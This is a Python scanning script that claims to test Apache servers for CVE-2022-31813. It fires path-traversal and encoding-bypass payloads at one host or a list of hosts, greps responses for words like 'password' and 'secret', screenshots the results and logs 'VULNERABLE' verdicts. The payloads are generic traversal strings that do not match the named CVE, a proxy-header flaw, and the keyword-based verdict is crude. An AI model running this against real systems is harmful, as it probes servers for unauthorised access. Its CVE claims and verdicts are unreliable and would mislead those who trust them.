#!/usr/bin/env python3
"""
CVE-2022-31813 Black-box Apache Exploit Tester
Author: Derek Odiorne
Version: 1.2
Last Updated: 2025-05-21

MITRE ATT&CK: T1190 – Exploit Public-Facing Application
"""

import requests
import argparse
import csv
import os
import sys
from urllib.parse import urljoin
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from time import sleep
from datetime import datetime

requests.packages.urllib3.disable_warnings()

# ANSI colors
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

payloads = [
    "/app/../admin",
    "/app/%2e%2e/admin",
    "/app/..;/admin",
    "/app/%252e%252e/admin",
    "/app/..%2Fadmin"
]

TIMESTAMP = datetime.now().strftime("%Y%m%d_%H%M%S")
output_dir = f"cve_31813_output_{TIMESTAMP}"
screenshots_dir = os.path.join(output_dir, "screenshots")
os.makedirs(screenshots_dir, exist_ok=True)
csv_path = os.path.join(output_dir, "results.csv")
csv_headers = ["Target", "Port", "Payload", "Full URL", "HTTP Code", "Content Length", "Sensitive Keywords", "Screenshot", "Vulnerability Verdict"]

def print_banner():
    print("=" * 72)
    print(" CVE-2022-31813 Apache Path Traversal & Proxy Bypass Tester")
    print(" Author       : Derek Odiorne")
    print(" Version      : 1.2")
    print(" Last Updated : 2025-05-21")
    print(f" MITRE ATT&CK : {CYAN}T1190 – Exploit Public-Facing Application{RESET}")
    print("=" * 72)

def capture_screenshot(url, filename):
    try:
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        driver = webdriver.Chrome(options=options)
        driver.set_page_load_timeout(15)
        driver.get(url)
        sleep(3)
        path = os.path.join(screenshots_dir, filename)
        driver.save_screenshot(path)
        driver.quit()
        return path
    except Exception as e:
        return f"Screenshot failed: {e}"

def test_target_on_port(base, port, writer):
    base_url = f"http://{base}:{port}"
    print(f"\n[+] Testing {base_url}...")

    try:
        r = requests.head(base_url, verify=False, timeout=10)
        server = r.headers.get("Server", "Unknown")
        print(f"[+] Server header: {YELLOW}{server}{RESET}")
    except Exception as e:
        print(f"{RED}[-] Could not reach {base_url}: {e}{RESET}")
        return

    vulnerable = False

    for payload in payloads:
        full_url = urljoin(base_url, payload)
        print(f"    [>] Testing payload: {payload}")
        try:
            r = requests.get(full_url, verify=False, timeout=15)
            status = r.status_code
            length = len(r.text)
            keywords = ["password", "secret", "confidential", "admin", "internal"]
            hits = [k for k in keywords if k in r.text.lower()]
            alert = ", ".join(hits) if hits else ""
            if status == 200 and alert:
                vulnerable = True
                verdict = "VULNERABLE"
                print(f"    {RED}[!] Possible sensitive content exposed ({status}, {length} bytes): {alert}{RESET}")
            else:
                verdict = "NOT VULNERABLE"
                print(f"    {GREEN}[OK]{RESET} HTTP {status}, {length} bytes")

            ss_name = f"{base}_{port}_{payload.replace('/', '_')}.png"
            screenshot = capture_screenshot(full_url, ss_name)
            writer.writerow([base, port, payload, full_url, status, length, alert, screenshot, verdict])

        except Exception as e:
            print(f"    {RED}[!] Error: {e}{RESET}")
            writer.writerow([base, port, payload, full_url, "ERROR", 0, "", f"Error: {e}", "UNKNOWN"])

    # Final verdict summary
    if vulnerable:
        print(f"{RED}[!!] {base}:{port} is VULNERABLE to CVE-2022-31813!{RESET}")
    else:
        print(f"{GREEN}[OK] {base}:{port} is NOT vulnerable to CVE-2022-31813.{RESET}")

def main():
    print_banner()
    parser = argparse.ArgumentParser(description="Apache CVE-2022-31813 vulnerability tester with color-coded output, CSV logging, and screenshots")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-t", "--target", help="Target IP or hostname")
    group.add_argument("-f", "--file", help="File containing list of IPs/hosts")
    parser.add_argument("--port", type=int, default=80, help="Port to test (default: 80)")

    args = parser.parse_args()

    os.makedirs(output_dir, exist_ok=True)
    with open(csv_path, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(csv_headers)

        targets = []
        if args.target:
            targets.append(args.target.strip())
        elif args.file:
            with open(args.file, "r") as tf:
                targets = [line.strip() for line in tf if line.strip()]

        for target in targets:
            test_target_on_port(target, args.port, writer)

    print(f"\n[+] Scan complete.")
    print(f"[+] Results saved to: {csv_path}")
    print(f"[+] Screenshots saved in: {screenshots_dir}")

if __name__ == "__main__":
    main()

